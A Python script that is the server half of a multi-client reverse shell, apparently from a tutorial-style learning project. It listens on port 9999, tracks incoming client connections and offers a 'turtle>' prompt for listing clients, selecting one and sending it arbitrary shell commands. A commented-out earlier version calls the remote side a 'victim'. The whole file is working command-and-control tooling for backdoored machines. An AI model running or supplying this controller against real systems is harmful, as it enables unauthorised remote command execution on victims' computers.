import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUNMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []



#create a socket ( Connect to Computers)
def create_socket():

    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


#bind this socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


#establish connection with a client (socket must be listening)
# def socket_accept():
#     conn, address = s.accept()
#     print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
#
#     send_commands(conn)
#     conn.close()
#
#
# #send command to client/victim or a friend
# def send_commands(conn):
#     while True:
#         cmd = input()
#         if cmd == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(cmd)) > 0:
#             conn.send(str.encode(cmd))
#
#             #convert bytes to string format to be changed into string
#             client_response = str(conn.recv(1024), "utf-8")
#             print(client_response, end="")

# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()
#
# main()

# #different for multi threading

# Handling multiple connections
# Closing previous connections when server.py file is restarted

def accepting_connections():
    #xoa du lieu cu moi lan restart
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)        #prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established: " + address[0])

        except:
            print("Error found")


# 2nd thread functions - 1. See all client , 2. Select a client , 3.Send commands to the connected client

def start_shell():
    while True:
        cmd = input('turtle> ')
        if cmd =='list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# display all current active connections
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)           #random number for large return data

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

    print("------- Clients -------" + "\n" + results)



def get_target(cmd):
    try:
        target = cmd.replace('select', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")

    except:
        print("Selection not valid")
        conn = None

    return conn



def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")         #convert bytes to string format to be changed into string
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


def create_workers():
    for x in range(NUMBER_OF_THREADS):
        t= threading.Thread(target=work)
        t.daemon = True             # make sure the thread dies when the main thread dies
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_shell()

        queue.task_done()           # co san, ko can lam



def create_jobs():
    for x in JOB_NUNMBER:
        queue.put(x)

    queue.join()



create_workers()
create_jobs()

